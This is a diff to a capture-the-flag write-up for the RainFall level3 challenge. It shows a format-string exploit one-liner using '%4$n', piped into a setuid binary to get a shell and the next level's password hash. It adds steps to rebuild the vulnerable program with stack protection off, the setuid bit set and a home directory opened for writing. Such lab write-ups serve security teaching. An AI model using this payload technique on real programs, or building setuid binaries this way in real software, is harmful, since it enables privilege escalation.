@@ -88,7 +88,7 @@ next we instruct printf to write the count (64 or 0x40) into its 4th parameter: 
 
 and thats our entire exploit:
 
-    level3@RainFall:~$ (python -c "print('\x08\x04\x98\x8c'[::-1] + 60 * 'A' + '%4\$n')"; cat) | ./level3 
+    level3@RainFall:~$ (python -c "print('\x08\x04\x98\x8c'[::-1] + 60 * 'A' + '%4\$n')"; cat) | ~/level3
     ?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
     Wait what?!
     whoami
@@ -97,5 +97,25 @@ and thats our entire exploit:
     b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
     level3@RainFall:~$ 
         
+
+# ------------------------------------------------------------------------
+# Recreate the exploitable program
+# ------------------------------------------------------------------------
+
+# As user level4:
+
+    # Compile the program in /tmp
+    gcc source3.c -fno-stack-protector -o ft_level3
+
+    # Edit suid
+    chmod u+s ft_level3
+
+    # Move the exploit to home directory
+    chmod +wx ~; mv ft_level3 ~
+
+# As user level3:
+
+    # Run the program
+    (python -c "print('\x08\x04\xa0\x4c'[::-1] + 60 * 'A' + '%4\$n')"; cat) | /home/user/level4/ft_level3
 
 
